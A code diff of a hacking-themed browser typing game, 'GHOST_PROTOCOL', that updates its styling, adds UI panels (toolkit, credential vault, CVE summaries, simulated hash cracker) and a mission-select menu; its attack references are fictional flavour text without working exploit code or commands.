-.notif.bad{background:rgba(255,34,68,0.05);border-color:var(--red);color:var(--red);}
-.notif.info{background:rgba(0,229,255,0.05);border-color:var(--cyan);color:var(--cyan);}
-.notif.warn{background:rgba(255,170,0,0.05);border-color:var(--amber);color:var(--amber);}
+/* ═══ NOTIFS ═══ */
+#notifs{position:fixed;top:44px;right:205px;z-index:400;display:flex;flex-direction:column;gap:4px;pointer-events:none;}
+.notif{font-family:var(--mono);font-size:8.5px;letter-spacing:.12em;text-transform:uppercase;
+  padding:5px 10px;border-left:2px solid;animation:nsl .25s ease;max-width:240px;}
+.notif.ok{background:rgba(0,255,136,.04);border-color:var(--g);color:var(--g);}
+.notif.bad{background:rgba(255,34,68,.04);border-color:var(--rd);color:var(--rd);}
+.notif.info{background:rgba(0,229,255,.04);border-color:var(--cy);color:var(--cy);}
+.notif.warn{background:rgba(255,170,0,.04);border-color:var(--am);color:var(--am);}
 @keyframes nsl{from{opacity:0;transform:translateX(8px);}to{opacity:1;}}
 
-/* ── END ── */
-#s-end{background:rgba(2,4,8,0.98);}
-.end-title{font-family:var(--disp);font-size:clamp(28px,6vw,56px);font-weight:900;letter-spacing:0.1em;margin-bottom:0.4rem;}
-.end-title.win{color:var(--green);text-shadow:0 0 28px rgba(0,255,136,0.4);}
-.end-title.fail{color:var(--red);text-shadow:0 0 28px rgba(255,34,68,0.4);}
-.end-msg{font-size:12px;color:var(--text2);letter-spacing:0.1em;margin-bottom:1.75rem;text-align:center;line-height:1.9;max-width:480px;}
-.end-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;margin-bottom:1.75rem;width:min(440px,90vw);}
-.end-stat{background:var(--bg2);border:1px solid var(--b1);padding:0.7rem;text-align:center;}
-.end-stat-l{font-size:7px;letter-spacing:0.2em;color:var(--text3);margin-bottom:4px;text-transform:uppercase;}
-.end-stat-v{font-size:19px;color:var(--green);}
+/* ═══ END ═══ */
+#s-end{background:rgba(1,3,6,.98);}
+.etitle{font-family:var(--disp);font-size:clamp(22px,5vw,48px);font-weight:900;
+  letter-spacing:.1em;margin-bottom:.3rem;color:var(--g);}
+.emsg{font-size:11.5px;color:var(--tx2);letter-spacing:.07em;margin-bottom:1.5rem;
+  text-align:center;line-height:2;max-width:520px;}
+.estats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:1.5rem;width:min(520px,92vw);}
+.estat{background:var(--bg2);border:1px solid var(--b1);padding:.65rem;text-align:center;}
+.estatl{font-size:7px;letter-spacing:.18em;color:var(--tx3);margin-bottom:3px;text-transform:uppercase;}
+.estatv{font-size:18px;color:var(--g);font-family:var(--disp);}
 
-@media(max-width:700px){#sidebar,#log-panel{display:none;}#s-game{flex-direction:column;}}
+/* responsive */
+@media(max-width:800px){#sb,#rp{display:none;}#s-game{flex-direction:column;}}
 </style>
 </head>
 <body>
-<canvas id="bg-canvas"></canvas>
-
+<canvas id="bgc"></canvas>
 <!-- TITLE -->
 <div class="screen" id="s-title">
-  <div class="logo">GHOST_PROTOCOL</div>
-  <div class="logo-sub">CYBER HEIST · INTERACTIVE</div>
-  <div class="t-divider"></div>
-  <p class="tagline">You are GHOST — freelance hacker for hire.<br>Type commands to <b>breach</b>, <b>manipulate</b>, and <b>exfiltrate</b>.<br>Every keystroke counts.</p>
-  <button class="play-btn" onclick="initGame()">DEPLOY</button>
-  <div class="credit">// 5 MISSIONS · BRANCHING PATHS · LIVE IDS PRESSURE</div>
+  <div class="logo-wrap">
+    <div class="logo">GHOST_PROTOCOL</div>
+    <div class="logo-line"></div>
+  </div>
+  <div class="logo-sub">ADVANCED PERSISTENT THREAT SIMULATOR · v3.0</div>
+  <div class="hdiv"></div>
+  <p class="tagline">Real attack chains. Real CVEs. Real methodology.<br><b>OSINT → Exploit → PrivEsc → Persist → Lateral → Exfil → Vanish.</b><br>Fail any sequence and the mission is burned.</p>
+  <button class="play-btn" id="playbtn" onclick="showMS()">◈ SELECT OPERATION ◈</button>
+  <div id="ms"></div>
+  <div class="credit">SHODAN · NMAP · GHOSTCAT · PROXYLOGON · KERBEROASTING<br>MIMIKATZ · CHISEL · BLOODHOUND · DOCKER ESCAPE · DNS TUNNELING</div>
 </div>
 
 <!-- GAME -->
 <div class="screen hide" id="s-game">
-  <div id="sidebar">
-    <div class="sb-hdr">MISSION MAP <span>// OP</span></div>
-    <div id="mission-nodes"></div>
-    <div id="sb-stats">
-      <div class="sb-hdr" style="margin:-1px -0.85rem 0.7rem;padding:0.55rem 0.85rem;">OPERATOR</div>
-      <div class="sb-stat">
-        <div class="sb-sh"><span>STEALTH</span><span class="sb-v" id="sv-s">85</span></div>
-        <div class="sb-trk"><div class="sb-fill g" id="sf-s" style="width:85%"></div></div>
-      </div>
-      <div class="sb-stat">
-        <div class="sb-sh"><span>HACKING</span><span class="sb-v" id="sv-h">70</span></div>
-        <div class="sb-trk"><div class="sb-fill c" id="sf-h" style="width:70%"></div></div>
-      </div>
-      <div class="sb-stat">
-        <div class="sb-sh"><span>SOCIAL</span><span class="sb-v" id="sv-o">55</span></div>
-        <div class="sb-trk"><div class="sb-fill a" id="sf-o" style="width:55%"></div></div>
-      </div>
+  <!-- LEFT SIDEBAR -->
+  <div id="sb">
+    <div class="sh">ATTACK CHAIN <span id="sbop">// OP</span></div>
+    <div id="mnodes"></div>
+
+    <div id="sstats">
+      <div class="sh" style="margin:-1px -.7rem .55rem;padding:.4rem .7rem;">OPERATOR STATS</div>
+      <div class="sst"><div class="ssh"><span>STEALTH</span><span class="sv" id="svs">—</span></div><div class="strk"><div class="sf g" id="sfs" style="width:0%"></div></div></div>
+      <div class="sst"><div class="ssh"><span>SKILL</span><span class="sv" id="svh">—</span></div><div class="strk"><div class="sf c" id="sfh" style="width:0%"></div></div></div>
+      <div class="sst"><div class="ssh"><span>OPSEC</span><span class="sv" id="svop">—</span></div><div class="strk"><div class="sf a" id="sfop" style="width:0%"></div></div></div>
+      <div class="sst"><div class="ssh"><span>HEAT</span><span class="sv" id="svht" style="color:var(--rd)">—</span></div><div class="strk"><div class="sf r" id="sfht" style="width:0%"></div></div></div>
     </div>
-    <div id="sb-ids">
-      <div class="ids-lbl">IDS DETECTION</div>
-      <div id="ids-track"><div id="ids-fill" style="width:5%"></div></div>
-      <div id="ids-pct">5%</div>
+
+    <div id="stools">
+      <div class="sh" style="margin:-1px -.7rem .5rem;padding:.4rem .7rem;">TOOLKIT</div>
+      <div id="toollist"></div>
+    </div>
+
+    <div id="screds">
+      <div class="sh" style="margin:-1px -.7rem .5rem;padding:.4rem .7rem;">CREDENTIAL VAULT</div>
+      <div id="credlist"><div style="font-size:8px;color:var(--tx3);padding:2px 0;">[ no creds harvested ]</div></div>
+    </div>
+
+    <div id="sids">
+      <div class="idslbl">IDS / SOC DETECTION</div>
+      <div id="idstrk"><div id="idsfill" style="width:5%"></div></div>
+      <div id="idspct">5%</div>
     </div>
   </div>
 
-  <div id="terminal-wrap">
-    <div id="top-bar">
-      <div id="tb-logo">GHOST_PROTOCOL</div>
-      <div class="tb-sep">//</div>
-      <div id="tb-loc">INITIALIZING...</div>
-      <div id="tb-badge" class="low">THREAT: LOW</div>
-      <div id="tb-time">00:00</div>
+  <!-- CENTER TERMINAL -->
+  <div id="tw">
+    <div id="topbar">
+      <div id="tbl">GHOST_PROTOCOL</div>
+      <div class="tbsep">//</div>
+      <div id="tbloc">—</div>
+      <div class="tbsep">//</div>
+      <div id="tbph">INIT</div>
+      <div id="tbbdg" class="low">THREAT: LOW</div>
+      <div id="tbtime">00:00</div>
     </div>
-    <div id="term-out"></div>
-    <div id="bottom-bar">
+    <div id="tout"></div>
+    <div id="bb">
       <div id="choices"></div>
-      <div id="input-section">
-        <div id="input-prefix">ghost@op:~$</div>
-        <input
-          id="cmd-input"
-          type="text"
-          autocomplete="off"
-          autocorrect="off"
-          autocapitalize="off"
-          spellcheck="false"
-          placeholder="type command here and press Enter..."
-        />
+      <div id="insec">
+        <div id="inpfx">ghost@op:~$</div>
+        <input id="cmd" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="type command and press Enter..."/>
       </div>
-      <div id="hint-bar">
-        <div id="hint-txt">AWAITING INPUT</div>
-        <div id="wpm-txt">WPM:&nbsp;<span id="wpm-val">—</span></div>
+      <div id="hintbar">
+        <div id="hinttxt">AWAITING INPUT</div>
+        <div id="wpmtxt">WPM:&nbsp;<span id="wpmv">—</span></div>
       </div>
     </div>
   </div>
 
-  <div id="log-panel">
-    <div class="sb-hdr">ACTIVITY <span>// LOG</span></div>
-    <div id="log-out"></div>
+  <!-- RIGHT PANEL -->
+  <div id="rp">
+    <div class="sh">LIVE NETWORK</div>
+    <canvas id="netc"></canvas>
+    <div class="sh">ACTIVE CVE</div>
+    <div id="cvepanel"><div style="font-size:8px;color:var(--tx3)">[ no active exploit ]</div></div>
+    <div class="sh">HASH CRACKING</div>
+    <div id="crackpanel">
+      <div class="cp-lbl">HASHCAT RUNNING</div>
+      <div class="cp-hash" id="cp-hash">—</div>
+      <div id="cp-bar-wrap"><div id="cp-bar" style="width:0%"></div></div>
+      <div class="cp-status">Speed: <span id="cp-speed">—</span> · ETA: <span id="cp-eta">—</span></div>
+      <div class="cp-status" style="margin-top:2px">Result: <span id="cp-result" style="color:var(--tx3)">cracking...</span></div>
+    </div>
+    <div class="sh">TARGET INTEL</div>
+    <div id="tgtpanel"><div id="tgtrows"><div style="font-size:8px;color:var(--tx3)">[ no intel gathered ]</div></div></div>
+    <div class="sh">LOG</div>
+    <div id="logpanel"></div>
   </div>
 </div>
 
-<!-- MINI-GAME -->
+<!-- MINI-GAME OVERLAY -->
 <div id="mg">
-  <div id="mg-title">BREACH SEQUENCE</div>
-  <div id="mg-box">
-    <div id="mg-inst"></div>
-    <div id="mg-prompt"></div>
-    <input id="mg-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="Type here..."/>
-    <div id="mg-meta">
-      <div><div id="mg-pbar"><div id="mg-pfill" style="width:0%"></div></div></div>
-      <div id="mg-timer">—</div>
-      <div id="mg-wpm-txt">WPM: —</div>
+  <div id="mghead"><div id="mgtitle">EXPLOIT SEQUENCE</div><div id="mgph">PHASE</div></div>
+  <div id="mgbox">
+    <div id="mgctx"></div>
+    <div id="mginst"></div>
+    <div id="mgprompt"></div>
+    <input id="mginput" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="Type here..."/>
+    <div id="mgmeta">
+      <div id="mgpbarwrap"><div id="mgpbar"><div id="mgpfill" style="width:0%"></div></div><div id="mgsteps">0/0</div></div>
+      <div id="mgtimer">—</div>
+      <div id="mgwpm">WPM: —</div>
+    </div>
+    <div id="mgfail">
+      <div class="ftitle">// OPERATION BURNED</div>
+      <div class="fmsg" id="mgfailmsg">IDS flagged the intrusion.</div>
+      <div class="fbtns"><button class="rbtn" id="retrybtn">RETRY SEQUENCE</button><button class="mbtn" onclick="goMenu()">ABORT MISSION</button></div>
     </div>
   </div>
 </div>
 
 <div id="notifs"></div>
 
-<!-- END -->
+<!-- END SCREEN -->
 <div class="screen hide" id="s-end">
-  <div class="end-title" id="end-title">MISSION COMPLETE</div>
-  <div class="t-divider"></div>
-  <p class="end-msg" id="end-msg"></p>
-  <div class="end-stats">
-    <div class="end-stat"><div class="end-stat-l">Final WPM</div><div class="end-stat-v" id="e-wpm">—</div></div>
-    <div class="end-stat"><div class="end-stat-l">IDS Peak</div><div class="end-stat-v" id="e-ids">—</div></div>
-    <div class="end-stat"><div class="end-stat-l">Stealth</div><div class="end-stat-v" id="e-st">—</div></div>
+  <div class="etitle">◈ MISSION COMPLETE ◈</div>
+  <div class="hdiv"></div>
+  <p class="emsg" id="endmsg"></p>
+  <div class="estats">
+    <div class="estat"><div class="estatl">Peak WPM</div><div class="estatv" id="ewpm">—</div></div>
+    <div class="estat"><div class="estatl">IDS Peak</div><div class="estatv" id="eids">—</div></div>
+    <div class="estat"><div class="estatl">Stealth</div><div class="estatv" id="est">—</div></div>
+    <div class="estat"><div class="estatl">OPSEC</div><div class="estatv" id="eop">—</div></div>
   </div>
-  <button class="play-btn" onclick="location.reload()">REDEPLOY</button>
+  <button class="play-btn" onclick="goMenu()">◈ NEXT OPERATION ◈</button>
 </div>
 
 <script>
-/* ── MATRIX RAIN ── */
+/* ═══ MATRIX RAIN ═══ */
 (()=>{
-  const c=document.getElementById('bg-canvas');
-  const r=()=>{c.width=innerWidth;c.height=innerHeight;};r();addEventListener('resize',r);
+  const c=document.getElementById('bgc');
+  const resize=()=>{c.width=innerWidth;c.height=innerHeight;};resize();
+  addEventListener('resize',resize);
   const ctx=c.getContext('2d');
-  const ch='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*[]{}|<>/\\';
-  let d=[];
-  setInterval(()=>{
-    const cols=Math.floor(c.width/13);
-    while(d.length<cols)d.push(Math.random()*c.height/13);
-    while(d.length>cols)d.pop();
-    ctx.fillStyle='rgba(2,4,8,0.055)';ctx.fillRect(0,0,c.width,c.height);
-    ctx.fillStyle='#00ff88';ctx.font='12px Share Tech Mono';
-    d.forEach((y,i)=>{ctx.fillText(ch[Math.floor(Math.random()*ch.length)],i*13,y*13);if(y*13>c.height&&Math.random()>0.975)d[i]=0;d[i]++;});
-  },55);
+  const chars='アイウエオカキクケコサシスセソタチツテトナニヌネノABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*[]{}|<>/\\';
+  let drops=[];
+  const step=()=>{
+    const cols=Math.floor(c.width/14);
+    while(drops.length<cols)drops.push(Math.random()*c.height/14);
+    while(drops.length>cols)drops.pop();
+    ctx.fillStyle='rgba(1,3,6,.065)';ctx.fillRect(0,0,c.width,c.height);
+    drops.forEach((y,i)=>{
+      const bright=Math.random()>.97;
+      ctx.fillStyle=bright?'#7affb0':'#00ff88';
+      ctx.font=(bright?'bold ':'')+'12px Share Tech Mono';
+      ctx.globalAlpha=bright?.9:.25;
+      ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*14,y*14);
+      ctx.globalAlpha=1;
+      if(y*14>c.height&&Math.random()>.975)drops[i]=0;drops[i]+=.8;
+    });
+  };
+  setInterval(step,60);
 })();
 
-/* ── STATE ── */
-const G={
-  stats:{s:85,h:70,o:55},ids:5,
-  scene:null,
-  expectedCmd:'',
-  mg:{active:false},
-  wpmStart:null,wpmChars:0,
-  start:Date.now(),peakIds:5,
+/* ═══ NETWORK VISUALIZATION ═══ */
+(()=>{
+  const c=document.getElementById('netc');
+  const resize=()=>{c.width=c.offsetWidth||195;c.height=80;};resize();
+  const ctx=c.getContext('2d');
+  const nodes=Array.from({length:9},(_,i)=>({
+    x:15+Math.random()*165,y:8+Math.random()*64,
+    vx:(Math.random()-.5)*.35,vy:(Math.random()-.5)*.35,
+    r:1.2+Math.random()*2,p:Math.random()*Math.PI*2,
+    col:['#00ff88','#00e5ff','#00ff88','#ffaa00'][Math.floor(Math.random()*4)]
+  }));
+  let packets=[];
+  setInterval(()=>{
+    if(Math.random()>.85&&nodes.length>1){
+      const a=nodes[Math.floor(Math.random()*nodes.length)];
+      const b=nodes[Math.floor(Math.random()*nodes.length)];
+      if(a!==b)packets.push({x:a.x,y:a.y,tx:b.x,ty:b.y,t:0});
+    }
+  },800);
+  setInterval(()=>{
+    ctx.clearRect(0,0,c.width,c.height);
+    nodes.forEach(n=>{n.x+=n.vx;n.y+=n.vy;if(n.x<5||n.x>c.width-5)n.vx*=-1;if(n.y<5||n.y>c.height-5)n.vy*=-1;n.p+=.04;});
+    for(let i=0;i<nodes.length;i++)for(let j=i+1;j<nodes.length;j++){
+      const d=Math.hypot(nodes[i].x-nodes[j].x,nodes[i].y-nodes[j].y);
+      if(d<60){ctx.beginPath();ctx.moveTo(nodes[i].x,nodes[i].y);ctx.lineTo(nodes[j].x,nodes[j].y);ctx.strokeStyle=`rgba(0,255,136,${.18*(1-d/60)})`;ctx.lineWidth=.6;ctx.stroke();}
+    }
+    packets=packets.filter(p=>{
+      p.t+=.06;if(p.t>1)return false;
+      const px=p.x+(p.tx-p.x)*p.t;const py=p.y+(p.ty-p.y)*p.t;
+      ctx.beginPath();ctx.arc(px,py,2,0,Math.PI*2);ctx.fillStyle='rgba(0,229,255,.9)';ctx.fill();
+      return true;
+    });
+    nodes.forEach(n=>{
+      ctx.beginPath();ctx.arc(n.x,n.y,n.r,0,Math.PI*2);ctx.fillStyle=n.col;ctx.fill();
+      ctx.beginPath();ctx.arc(n.x,n.y,n.r+3+Math.sin(n.p)*1.5,0,Math.PI*2);
+      ctx.strokeStyle=`rgba(0,255,136,${.08+Math.sin(n.p)*.05})`;ctx.lineWidth=.7;ctx.stroke();
+    });
+  },50);
+})();
+
+/* ═══ STATE ═══ */
+let G={};let CM=null;let CBC={};
+let progress={};let unlockedTools=[];let targetIntel={};let credVault=[];
+try{progress=JSON.parse(localStorage.getItem('gp4')||'{}');}catch(e){}
+const saveP=()=>{try{localStorage.setItem('gp4',JSON.stringify(progress));}catch(e){}};
+
+/* ═══ TOOLS ═══ */
+const TOOLS=[
+  {id:'nmap',   icon:'🔍',label:'Nmap'},
+  {id:'burp',   icon:'🕸', label:'Burp Suite'},
+  {id:'msf',    icon:'💀',label:'Metasploit'},
+  {id:'john',   icon:'🔐',label:'Hashcat'},
+  {id:'chisel', icon:'🚇',label:'Chisel'},
+  {id:'mimi',   icon:'👤',label:'Mimikatz'},
+  {id:'bh',     icon:'🩸',label:'BloodHound'},
+  {id:'impack', icon:'🐍',label:'Impacket'},
+];
+const unlockTool=id=>{if(!unlockedTools.includes(id)){unlockedTools.push(id);renderTools();notify(TOOLS.find(t=>t.id===id).label+' unlocked','info');}};
+const renderTools=()=>{document.getElementById('toollist').innerHTML=TOOLS.map(t=>`<div class="ti ${unlockedTools.includes(t.id)?'on':''}"><span class="ticon">${t.icon}</span>${t.label}</div>`).join('');};
+
+/* ═══ CREDENTIAL VAULT ═══ */
+const addCred=(type,val)=>{credVault.push({type,val});renderCreds();notify('Credential captured: '+type,'warn');};
+const renderCreds=()=>{
+  const el=document.getElementById('credlist');
+  if(!credVault.length){el.innerHTML='<div style="font-size:8px;color:var(--tx3)">[ no creds harvested ]</div>';return;}
+  el.innerHTML=credVault.slice(-6).map(c=>`<div class="cred-item"><span class="cred-type">${c.type}</span><span class="cred-val">${c.val}</span></div>`).join('');
 };
 
-/* ── MISSION NODES ── */
-const NODES=[
-  {id:'recon', label:'RECON',      icon:'📡',st:'done'},
-  {id:'vpn',   label:'VPN TUNNEL', icon:'🔒',st:'active'},
-  {id:'breach',label:'BREACH',     icon:'🛡',st:'locked'},
-  {id:'vault', label:'BLACKVAULT', icon:'💾',st:'locked'},
-  {id:'exfil', label:'EXFIL',      icon:'🚁',st:'locked'},
+/* ═══ CVE PANEL ═══ */
+const CVE_DATA={
+  'CVE-2020-1938':{score:'9.8 CRITICAL',desc:'Apache Tomcat AJP connector allows unauthenticated file read and RCE via crafted AJP request to port 8009.'},
+  'CVE-2021-26855':{score:'9.1 CRITICAL',desc:'Exchange Server SSRF allows forged auth as any user. Chained with CVE-2021-27065 for pre-auth RCE.'},
+  'CVE-2019-19781':{score:'9.8 CRITICAL',desc:'Citrix ADC path traversal allows unauthenticated execution of arbitrary Perl scripts as root.'},
+  'CVE-2018-0101':{score:'10.0 CRITICAL',desc:'Cisco ASA XML parser heap double-free causes unauthenticated remote code execution.'},
+  'CVE-2022-22965':{score:'9.8 CRITICAL',desc:'Spring Framework ClassLoader manipulation via DataBinder enables unauthenticated RCE on JDK9+.'},
+  'CVE-2019-11510':{score:'10.0 CRITICAL',desc:'Pulse Secure VPN arbitrary file read exposes cached credentials including plaintext passwords.'},
+};
+const showCVE=(id)=>{
+  const d=CVE_DATA[id];if(!d)return;
+  document.getElementById('cvepanel').innerHTML=`<div class="cve-tag">${id}</div><div class="cve-score">CVSS: <span>${d.score}</span></div><div class="cve-desc">${d.desc}</div>`;
+};
+
+/* ═══ TARGET INTEL ═══ */
+const setIntel=(k,v,c)=>{targetIntel[k]={v,c:c||''};
+  document.getElementById('tgtrows').innerHTML=Object.entries(targetIntel).map(([k,o])=>`<div class="tprow"><span class="tpk">${k}</span><span class="tpv ${o.c}">${o.v}</span></div>`).join('');};
+
+/* ═══ HASH CRACKER SIMULATION ═══ */
+let crackTimer=null;
+const startCrack=(hash,speed,eta,result,onDone)=>{
+  const panel=document.getElementById('crackpanel');panel.classList.add('show');
+  document.getElementById('cp-hash').textContent=hash;
+  document.getElementById('cp-speed').textContent=speed;
+  document.getElementById('cp-eta').textContent=eta;
+  document.getElementById('cp-result').textContent='cracking...';
+  document.getElementById('cp-result').style.color='var(--tx3)';
+  document.getElementById('cp-bar').style.width='0%';
+  clearInterval(crackTimer);let pct=0;
+  crackTimer=setInterval(()=>{
+    pct+=Math.random()*3+1;if(pct>100)pct=100;
+    document.getElementById('cp-bar').style.width=pct+'%';
+    if(pct>=100){clearInterval(crackTimer);
+      document.getElementById('cp-result').textContent=result;
+      document.getElementById('cp-result').style.color='var(--g)';
+      notify('Hash cracked: '+result,'ok');if(onDone)setTimeout(onDone,600);}
+  },200);
+};
+
+/* ═══ MISSIONS ═══ */
+const MISSIONS=[
+  {id:'nvc',name:'OP: BLACKVAULT',diff:1,dl:'RECRUIT',
+   desc:'Full kill chain on a corporate server. OSINT, Ghostcat RCE, sudo PrivEsc, PTH lateral movement, HTTPS exfil, anti-forensics.',
+   nodes:['OSINT','PORT SCAN','EXPLOIT','PRIV ESC','PERSIST','LATERAL','EXFIL','CLEANUP']},
+  {id:'axn',name:'OP: PHANTOM GRID',diff:2,dl:'OPERATIVE',
+   desc:'ICS/SCADA infiltration. Citrix or Cisco ASA entry. Chisel pivot into OT. Siemens S7 PLC exploitation via python-snap7.',
+   nodes:['OSINT','EXPLOIT','PIVOT','SCADA','DNS EXFIL','WIPE']},
+  {id:'hls',name:'OP: SPECTRE',diff:3,dl:'SPECIALIST',
+   desc:'Nation-state contractor. ProxyLogon or Pulse Secure. Kerberoasting with live hashcrack UI. BloodHound AD paths. 35s sequences.',
+   nodes:['OSINT','INITIAL ACCESS','KERBEROAST','AD LATERAL','EXFIL','ANTI-FORENSICS']},
+  {id:'apx',name:'OP: OMEGA PROTOCOL',diff:4,dl:'GHOST',
+   desc:'AI-adaptive IDS. Spring4Shell. JWT algorithm confusion. Docker container escape. 28 second sequences. No margin.',
+   nodes:['RECON','SPRING4SHELL','JWT FORGE','DOCKER ESCAPE','DARK POOL','PURGE']},
 ];
-function renderNodes(){
-  document.getElementById('mission-nodes').innerHTML=NODES.map((n,i)=>`
-    ${i>0?'<div class="mnode-conn"></div>':''}
-    <div class="mnode ${n.st}">
-      <div class="mnode-icon">${n.icon}</div>
-      <div class="mnode-lbl ${n.st==='done'?'d':n.st==='active'?'a':''}">${n.label}</div>
-      <div class="mnode-st" style="color:${n.st==='done'?'var(--g2)':n.st==='active'?'var(--amber)':'var(--text3)'}">${n.st==='done'?'✓':n.st==='active'?'▶':'—'}</div>
-    </div>`).join('');
-}
-function activateNode(id){
-  const n=NODES.find(x=>x.id===id);if(!n)return;
-  const prev=NODES[NODES.indexOf(n)-1];if(prev&&prev.st==='active')prev.st='done';
-  n.st='active';renderNodes();
-}
 
-/* ── TERMINAL ── */
-let tQ=[];let tB=false;
-function tp(text,cls,delay){
-  cls=cls||'t-story';delay=delay||0;
-  tQ.push({text,cls,delay});if(!tB)pQ();
-}
-function pQ(){
-  if(!tQ.length){tB=false;return;}tB=true;
-  const item=tQ.shift();
-  setTimeout(()=>{
-    const out=document.getElementById('term-out');
-    const el=document.createElement('div');el.className='tl '+item.cls;
-    out.appendChild(el);out.scrollTop=out.scrollHeight;
-    if(item.cls==='t-story'||item.cls==='t-npc'||item.cls==='t-player'){
-      let i=0;
-      const iv=setInterval(()=>{
-        el.textContent=item.text.slice(0,i+1);i++;
-        out.scrollTop=out.scrollHeight;
-        if(i>=item.text.length){clearInterval(iv);setTimeout(pQ,60);}
-      },14);
-    } else {el.textContent=item.text;pQ();}
-  },item.delay);
-}
-function tSys(t){tp(t,'t-sys');}
-function tOK(t){tp(t,'t-ok');}
-function tErr(t){tp(t,'t-err');}
-function tWarn(t){tp(t,'t-warn');}
-function tNPC(n,t){tp('['+n+'] '+t,'t-npc',40);}
-function tYOU(t){tp('> '+t,'t-player');}
-function tHdr(t){tp(t,'t-hdr');}
-function tDiv(){tp('─'.repeat(46),'t-div');}
-function tBlank(){tp('','t-sys');}
-
-/* ── LOG ── */
-function log(msg,type){
-  type=type||'log-m';
-  const now=new Date();
-  const ts=String(now.getHours()).padStart(2,'0')+':'+String(now.getMinutes()).padStart(2,'0')+':'+String(now.getSeconds()).padStart(2,'0');
-  const el=document.createElement('div');el.className='log-e';
-  el.innerHTML='<span class="log-t">['+ts+']</span> <span class="'+type+'">'+msg+'</span>';
-  const lo=document.getElementById('log-out');lo.appendChild(el);lo.scrollTop=lo.scrollHeight;
-}
-
-/* ── STATS ── */
-function setStat(k,v){
-  v=Math.max(0,Math.min(100,v));G.stats[k]=v;
-  const sv=document.getElementById('sv-'+k);
-  const sf=document.getElementById('sf-'+k);
-  if(sv)sv.textContent=v;if(sf)sf.style.width=v+'%';
-}
-function setIDS(v){
-  v=Math.max(0,Math.min(100,v));G.ids=v;if(v>G.peakIds)G.peakIds=v;
-  document.getElementById('ids-fill').style.width=v+'%';
-  document.getElementById('ids-pct').textContent=v+'%';
-  document.getElementById('ids-fill').style.background=v<40?'var(--green)':v<70?'var(--amber)':'var(--red)';
-  document.getElementById('ids-pct').style.color=v<40?'var(--green)':v<70?'var(--amber)':'var(--red)';
-  const b=document.getElementById('tb-badge');
-  if(v<30){b.textContent='THREAT: LOW';b.className='low';}
-  else if(v<65){b.textContent='THREAT: MED';b.className='med';}
-  else{b.textContent='THREAT: HIGH';b.className='hi';}
-}
-function setLoc(t){document.getElementById('tb-loc').textContent=t;}
-
-/* ── NOTIFY ── */
-function notify(msg,type){
-  type=type||'info';
-  const el=document.createElement('div');el.className='notif '+type;el.textContent=msg;
-  document.getElementById('notifs').appendChild(el);
-  log(msg,type==='ok'?'log-ok':type==='bad'||type==='warn'?'log-wn':'log-m');
-  setTimeout(()=>el.remove(),3200);
-}
-
-/* ── CLOCK ── */
-setInterval(()=>{
-  const e=Math.floor((Date.now()-G.start)/1000);
-  const m=String(Math.floor(e/60)).padStart(2,'0');
-  const s=String(e%60).padStart(2,'0');
-  document.getElementById('tb-time').textContent=m+':'+s;
-},1000);
-
-/* ══════════════════════════════════════════
-   INPUT — simple visible text field
-   Player types command + presses Enter
-══════════════════════════════════════════ */
-const cmdInput=document.getElementById('cmd-input');
-
-cmdInput.addEventListener('keydown',function(e){
-  if(e.key==='Enter'){
-    e.preventDefault();
-    const val=cmdInput.value.trim().toLowerCase();
-    if(!val)return;
-    tYOU(val);
-    cmdInput.value='';
-
-    // WPM tracking
-    if(!G.wpmStart)G.wpmStart=Date.now();
-    G.wpmChars+=(val.length+1);
-    const mins=(Date.now()-G.wpmStart)/60000;
-    if(mins>0.01)document.getElementById('wpm-val').textContent=Math.round((G.wpmChars/5)/mins);
-
-    processCommand(val);
-  }
-});
-
-/* ── CHOICES (click buttons) ── */
-function showChoices(arr){
-  const el=document.getElementById('choices');el.innerHTML='';
-  arr.forEach(function(c){
-    const btn=document.createElement('button');
-    btn.className='choice'+(c.locked?' locked':'');
-    btn.textContent=c.label;
-    if(!c.locked){
-      btn.onclick=function(){
-        hideChoices();
-        tYOU(c.label);
-        enableInput(false);
-        c.go();
-      };
-    }
-    el.appendChild(btn);
+/* ═══ MISSION SELECT ═══ */
+function showMS(){
+  document.getElementById('playbtn').style.display='none';
+  const el=document.getElementById('ms');el.innerHTML='<div class="ms-hd">// SELECT OPERATION — UNLOCK IN ORDER</div>';el.classList.add('show');
+  MISSIONS.forEach((m,i)=>{
+    const unlocked=i===0||progress[MISSIONS[i-1].id]==='done';const done=progress[m.id]==='done';
+    const card=document.createElement('div');card.className='ms-card'+((!unlocked&&!done)?' locked':'')+(done?' done':'');
+    card.innerHTML=`<div class="ms-n">${String(i+1).padStart(2,'0')}</div><div class="ms-i"><div class="ms-nm">${m.name}${done?' <span class="ms-ok">✓</span>':''}</div><div class="ms-ds">${unlocked||done?m.desc:'[CLASSIFIED — COMPLETE PREVIOUS OPERATION]'}</div></div><div class="ms-r"><div class="ms-df d${m.diff}">${m.dl}</div><div style="font-size:7px;color:var(--tx3)">${m.nodes.length} PHASES</div></div>`;
+    if(unlocked||done)card.onclick=()=>launch(m);
+    el.appendChild(card);
   });
-  el.classList.add('show');
-}
-function hideChoices(){
-  const el=document.getElementById('choices');
-  el.classList.remove('show');
-  el.innerHTML='';
 }
 
-function enableInput(on,hint){
-  cmdInput.disabled=!on;
-  const h=document.getElementById('hint-txt');
-  if(on){
-    h.innerHTML=hint?'CMD: <span>'+hint+'</span>':'AWAITING INPUT';
-    cmdInput.focus();
-  } else {
-    h.textContent='SELECT AN OPTION ABOVE';
-    cmdInput.placeholder='...';
-  }
+function goMenu(){
+  clearInterval(G.mgt);clearInterval(G.clk);clearInterval(crackTimer);
+  document.getElementById('mg').classList.remove('show');
+  document.getElementById('mgfail').classList.remove('show');
+  document.getElementById('mginput').style.display='block';
+  document.getElementById('mgmeta').style.display='flex';
+  document.getElementById('crackpanel').classList.remove('show');
+  showScr('s-title');
+  document.getElementById('playbtn').style.display='block';
+  const ms=document.getElementById('ms');ms.classList.remove('show');ms.innerHTML='';showMS();
 }
 
-/* ── COMMAND PROCESSOR ── */
-function processCommand(cmd){
-  // Fuzzy match — strip extra spaces
-  cmd=cmd.replace(/\s+/g,' ').trim();
-
